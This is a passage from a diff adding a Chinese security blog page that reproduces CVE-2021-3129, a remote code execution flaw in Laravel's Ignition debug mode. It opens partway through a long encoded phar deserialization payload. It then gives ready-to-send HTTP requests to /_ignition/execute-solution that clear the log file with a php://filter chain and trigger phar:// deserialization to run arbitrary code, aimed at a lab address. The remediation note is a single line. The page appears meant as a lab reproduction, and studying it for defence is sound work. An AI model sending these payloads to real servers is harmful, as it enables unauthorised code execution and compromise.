x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;6A&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;38&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;76&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;74&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;52&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;68&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;31&#x3D;00&#x3D;76&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;74&#x3D;00&#x3D;44&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;64&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;46&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;35&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6B&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4E&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;67&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;79&#x3D;00&#x3D;42&#x3D;00&#x3D;6C&#x3D;00&#x3D;65&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;79&#x3D;00&#x3D;41&#x3D;00&#x3D;2F&#x3D;00&#x3D;50&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;34&#x3D;00&#x3D;79&#x3D;00&#x3D;65&#x3D;00&#x3D;57&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4B&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;34&#x3D;00&#x3D;79&#x3D;00&#x3D;65&#x3D;00&#x3D;57&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4B&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;54&#x3D;00&#x3D;38&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;48&#x3D;00&#x3D;78&#x3D;00&#x3D;45&#x3D;00&#x3D;73&#x3D;00&#x3D;65&#x3D;00&#x3D;4B&#x3D;00&#x3D;59&#x3D;00&#x3D;35&#x3D;00&#x3D;78&#x3D;00&#x3D;7A&#x3D;00&#x3D;7A&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;32&#x3D;00&#x3D;34&#x3D;00&#x3D;41&#x3D;00&#x3D;34&#x3D;00&#x3D;2F&#x3D;00&#x3D;56&#x3D;00&#x3D;34&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;72&#x3D;00&#x3D;77&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>10、发送如下数据包，清空对log文件中的干扰字符，只留下POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.20.120:8080</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 299</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试。</p>
+<p><img src="/images/Laravel/image-20210416144757530.png" alt="image-20210416144757530"></p>
+<p>11、使用<code>phar://</code>进行反序列化，执行任意代码（此时需要使用绝对路径）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.20.120:8080</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;storage&#x2F;logs&#x2F;laravel.log&#x2F;test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Laravel/image-20210416144926362.png" alt="image-20210416144926362"></p>
+<center>如上执行成功</center>
+
+<p>其他利用方式可参考：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/">PHP-FPM</a></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、更新至最新版本</p>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;laravel&#x2F;CVE-2021-3129</span><br><span class="line">https:&#x2F;&#x2F;whoamianony.top&#x2F;2021&#x2F;01&#x2F;15&#x2F;%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F;Laravel&#x2F;Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0&#x2F;</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Laravel" >
+    <span class="tag-code">Laravel</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/04/20/Zabbix/">
+        <span class="nav-arrow">← </span>
+        
+          Zabbix
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/05/13/Apache_SSI/">
+        
+          Apache SSI 远程命令执行
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">环境搭建</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%88%86%E7%B1%BB"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">漏洞实战分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2021-3129"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">CVE-2021-3129</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">3.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">3.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">3.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">3.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Referer"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">Referer</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/05/06/Laravel/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Laravel",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
+    皖ICP备19004273号-1
+  </p>
+    </a>
+</footer>
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
